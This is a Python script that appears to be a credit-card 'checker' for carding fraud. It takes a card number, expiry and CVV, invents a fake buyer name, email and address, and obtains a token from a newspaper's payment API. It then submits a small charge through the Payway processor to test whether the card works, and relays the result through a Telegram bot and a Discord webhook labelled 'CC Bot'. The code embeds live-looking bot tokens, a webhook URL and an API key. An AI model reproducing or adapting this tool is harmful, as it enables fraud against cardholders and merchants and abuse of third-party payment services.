
import random
import requests
import json
import threading
import re


def capture(source, start, end):
    result = re.search(f"{start}(.*?){end}", source)
    if result:
        return result.group(1)
    return ""


def edit_message_text(chat_id: str, message_id: str, text: str):
    api_token = "1581230554:AAEMd8sBlJop9pQQ-HwDWCh1BzDPfsKE83U"
    url = f"https://api.telegram.org/bot{api_token}/editMessageText"
    data = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': text,
        'parse_mode': 'html',
        'disable_web_page_preview': 'true',
    }
    response = requests.post(url, data=data)
    return response.json()


def send_discord_webhook(message: str):
    webhook_url = 'https://discord.com/api/webhooks/1082612313888149514/E_w6CQ92-VIiDumIK4aSaThG5KwiBV7c_IZnmbxxWcYJoFQbZaBMnhP96Lp0ETCsP13X'
    data = {
        'content': message,
        'username': 'CC Bot',
        'avatar_url': 'https://img.freepik.com/free-vector/illustration-credit-card-icon-isolated-white_1284-47653.jpg?w=740&t=st=1678185838~exp=1678186438~hmac=308a44c25ff1771d624c7fbc20d82f5366d374984055445f5127582709b0753a',
    }

    response = requests.post(webhook_url, json=data)
    return response.json()


def unc(cc: str, mes: str, ano: str, cvv: str, update_progress):


    # Skipping some code

    banned_bins = ["440393", "123456", "789012"]

    if str(cc)[:6] in banned_bins:
        return "<b>BANNED BIN</b>"

    first = "".join(random.sample("ZELTRAX", len("ZELTRAX")))
    last = "".join(random.sample("ROCKZ", len("ROCKZ")))
    first1 = "".join(random.sample("zeltrax85246", len("zeltrax85246")))
    email = f"{first1}@gmail.com"
    address = f"{random.randint(0, 9999)}+Main+Street"
    phone = random.randint(0, 9999999999)
    country = "US"
    st = ["AL", "NY", "CA", "FL", "WA"]
    state = random.choice(st)

    if state == "NY":
        zip_code = "10080"
        city = "New+York"
    elif state == "WA":
        zip_code = "98001"
        city = "Auburn"
    elif state == "AL":
        zip_code = "35005"
        city = "Adamsville"
    elif state == "FL":
        zip_code = "32003"
        city = "Orange+Park"
    else:
        zip_code = "90201"
        city = "Bell"

    # Replace PHP cURL requests with Python requests

    headers1 = {
        'Accept': 'application/json, text/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'api.buffalonews.com',
        'Origin': 'https://myaccount.buffalonews.com',
        'Referer': 'https://myaccount.buffalonews.com/',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
        'X-API-Key': '4UXESkHyTlBIcIFsDlibVfh6XaRZmfGT',
    }

    data1 = '{"Transaction":{"ECIType":7,"IDSource":224,"Amount":100,"Tax":0},"UserVal":"cfb1ef52ebf2308be6e0a4cf788f94f1c2b40136ac96b8f182ad78be76a6d52eaabc0d31036ad74c6bf92b2d2b3784a70c9af7bc4325c62a28b40e7a0f"}'
    response1 = requests.post('https://api.buffalonews.com/payment/payway/', headers=headers1, data=data1)

    result1 = response1.text
    auth = capture(result1, '"authToken":"', '"')
    tname = capture(result1, '"transactionName":"', '"')
    update_progress(50)


    headers2 = {
        'Accept': 'application/json, text/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'content-type': 'application/json',
        'Host': 'www.paywayws.com',
        'Origin': 'https://myaccount.buffalonews.com',
        'Referer': 'https://myaccount.buffalonews.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
    }

    data2 = json.dumps({
        "request": "sendQueuedTransaction",
        "paywayRequestToken": auth,
        "transactionName": tname,
        "transactionSourceId": 224,
        "accountInputMode": "primaryAccountNumber",
        "cardAccount": {
            "fsv": cvv,
            "accountNumber": cc,
            "expirationDate": f"{mes}/{ano}",
            "email": email,
            "firstName": first,
            "lastName": last,
            "address": "13 Allen St",
            "city": "New York",
            "state": "AL",
            "zip": "10002"
        }
    })

    response2 = requests.post('https://www.paywayws.com/PaywayWS/Payment/CreditCard', headers=headers2, data=data2)
    result2 = json.loads(response2.text)
    error_message = capture(response2.text, '"paywayMessage": "','"')
    update_progress(100)


    if result2.get("paywayCode") == "5000":
        return "Payment successful"
    else:
        return f"Error: {error_message}"







